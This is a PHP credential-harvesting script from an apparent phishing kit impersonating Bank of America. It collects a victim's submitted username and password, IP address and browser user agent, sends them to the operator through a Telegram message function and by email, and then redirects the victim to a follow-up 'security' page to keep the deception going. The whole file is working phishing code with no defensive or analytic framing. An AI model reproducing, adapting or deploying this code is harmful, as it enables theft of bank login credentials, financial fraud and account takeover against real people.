<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	$browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");

    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $username = $_POST['username'];
    $password = $_POST['password'];
    $serv = $_REQUEST['MainForm'];


    $sender_name = "EM6L3M";
    $uid = "sender";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**PassWord_INFO\n";
        $message .= "User-!P : ".$ip."\n";
        $message .= "----------------------------------------\n";
        $message .= "Username: ".$_POST['username']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PassWord: ".$_POST['password']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);


        //Main Content
        $main_subject = "LOGIN INFO l $ip";
        $main_body = "
	    PassWord : $Password <p>
	    
        User-Ip : $ip";
        

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
        header("location:security.html");
?>
